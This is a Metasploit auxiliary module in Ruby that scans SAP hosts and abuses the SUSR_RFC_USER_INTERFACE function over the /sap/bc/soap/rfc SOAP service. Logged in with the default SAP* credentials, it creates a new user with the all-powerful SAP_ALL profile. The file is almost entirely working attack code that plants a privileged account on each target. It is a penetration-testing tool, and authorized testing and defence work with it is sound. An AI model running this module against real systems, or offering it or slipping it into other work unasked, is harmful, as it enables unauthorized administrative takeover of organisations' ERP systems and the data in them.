##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy. I'd also like to thank Chris John Riley,
# Ian de Villiers and Joris van de Vis who have Beta tested the modules and
# provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(
        update_info(
            info,
            'Name' => 'SAP /sap/bc/soap/rfc SOAP Service SUSR_RFC_USER_INTERFACE Function User Creation',
            'Description' => %q{
              This module makes use of the SUSR_RFC_USER_INTERFACE function, through the SOAP
              /sap/bc/soap/rfc service, for creating/modifying users on a SAP.
            },
            'References' =>
                [
                    [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
                ],
            'Author' =>
                [
                    'Agnivesh Sathasivam',
                    'nmonkee'
                ],
            'License' => MSF_LICENSE
        )
    )
    register_options(
      [
        Opt::RPORT(8000),
        OptString.new('CLIENT', [true, 'SAP client', '001']),
        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
        OptString.new('PASSWORD', [true, 'Password', '06071992']),
        OptString.new('ABAP_PASSWORD',[false,'Password for the account (Default is msf1234)','msf1234']),
        OptString.new('ABAP_USER',[false,'Username for the account (Username in upper case only. Default is MSF)', 'MSF'])
      ], self.class)
  end

  def run_host(ip)
    data = '<?xml version="1.0" encoding="utf-8" ?>'
    data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
    data << '<env:Body>'
    data << '<n1:SUSR_RFC_USER_INTERFACE xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
    data << '<ACTIVITY>01</ACTIVITY>'
    data << '<PASSWORD>' + datastore['ABAP_PASSWORD'] + '</PASSWORD>'
    data << '<USER>' + datastore['ABAP_USER'] + '</USER>'
    data << '<USER_PROFILES>'
    data << '<item>'
    data << '<PROFN>SAP_ALL</PROFN>'
    data << '</item>'
    data << '</USER_PROFILES>'
    data << '</n1:SUSR_RFC_USER_INTERFACE>'
    data << '</env:Body>'
    data << '</env:Envelope>'

    begin
      vprint_status("[SAP] #{ip}:#{rport} - Attempting to create user '#{datastore['ABAP_USER']}' with password '#{datastore['ABAP_PASSWORD']}'")
      res = send_request_cgi({
        'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
        'method' => 'POST',
        'data' => data,
        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
        'ctype' => 'text/xml; charset=UTF-8',
        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
        'headers'  =>
          {
            'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
          }
        })
      if res and res.code == 200
        if res.body =~ /<h1>Logon failed<\/h1>/
          vprint_error("[SAP] #{ip}:#{rport} - Logon failed")
          return
        elsif res.body =~ /faultstring/
          error = []
          error = [ res.body.scan(%r{(.*?)}) ]
          vprint_error("[SAP] #{ip}:#{rport} - #{error.join.chomp}")
          return
        else
          print_good("[SAP] #{ip}:#{rport} - User '#{datastore['ABAP_USER']}' with password '#{datastore['ABAP_PASSWORD']}' created")
          return
        end
      elsif res and res.code == 500 and res.body =~ /USER_ALLREADY_EXISTS/
        vprint_error("[SAP] #{ip}:#{rport} - user already exists")
        return
      else
        vprint_error("[SAP] #{ip}:#{rport} - Unknown error")
        vprint_error("[SAP] #{ip}:#{rport} - Error code: " + res.code) if res
        vprint_error("[SAP] #{ip}:#{rport} - Error message: " + res.message) if res
        return
      end
    rescue ::Rex::ConnectionError
      vprint_error("[SAP] #{rhost}:#{rport} - Unable to connect")
      return
    end
  end
end
